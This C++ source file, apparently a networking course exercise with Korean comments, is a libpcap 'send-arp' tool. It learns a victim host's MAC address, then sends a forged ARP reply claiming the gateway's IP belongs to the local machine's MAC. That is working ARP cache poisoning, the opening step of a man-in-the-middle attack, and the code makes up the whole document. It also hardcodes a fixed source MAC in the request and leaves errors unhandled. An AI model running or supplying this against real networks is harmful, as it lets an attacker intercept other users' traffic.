#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <net/if.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ether.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#define SIZE_ETHERNET 14
const struct EthHdr *ethernet;
const struct ArpHdr *arp;


void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 0.0.0.1 0.0.0.2\n");
}

int main(int argc, char* argv[]) {

    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    char* sender_ip = argv[2]; //sender ip
    char* target_ip = argv[3]; //target ip(gateway)

	EthArpPacket packet;

//get my mac&ip-------------------------------------------------------
    unsigned char my_mac[6];
    char *my_ip;

    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));
    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }
    if (success) memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
    //(MAC 주소 가져오기 - 구글링 출처)
    //https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ -1);
    ioctl(sock, SIOCGIFADDR, &ifr);
    close(sock);
    my_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

//get senders mac
//request--------------------------------------------------------
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //broadcast
    packet.eth_.smac_ = my_mac;//Mac("00:0c:29:60:02:a1"); //My mac addr(receiver)
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request); //ARP Request는 broadcast

    packet.arp_.smac_ = Mac("00:0c:29:60:02:a1"); //my
    packet.arp_.sip_ = htonl(Ip(my_ip)); //my
    packet.arp_.tmac_ = Mac("ff:ff:ff:ff:ff:ff"); //broadcast
    packet.arp_.tip_ = htonl(Ip(sender_ip)); //you


    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    int i;
    while (true) {
        struct pcap_pkthdr* capHeader;
        const u_char* Cpacket;
        int res = pcap_next_ex(handle, &capHeader, &Cpacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        ethernet = (struct EthHdr*)(Cpacket);
        arp = (struct ArpHdr*)(Cpacket + SIZE_ETHERNET);
        if((ntohs(ethernet->type_)==0x0806) && ntohs(arp->op_) == 0x2 ){ //if ARP reply
            packet.arp_.tmac_ = Mac(ethernet->smac_);
            packet.eth_.dmac_ = Mac(ethernet->smac_);
            break;
        }
    }

//reply--------------------------------------------------------
    packet.eth_.smac_ = my_mac; //My mac addr
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply); //ARP Reply는 unicast

    packet.arp_.smac_ = my_mac; //my
    packet.arp_.sip_ = htonl(Ip(target_ip));//htonl(Ip("0.0.0.0")); //gateway
    packet.arp_.tip_ = htonl(Ip(sender_ip)); //you
//--------------------------------------------------------
    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
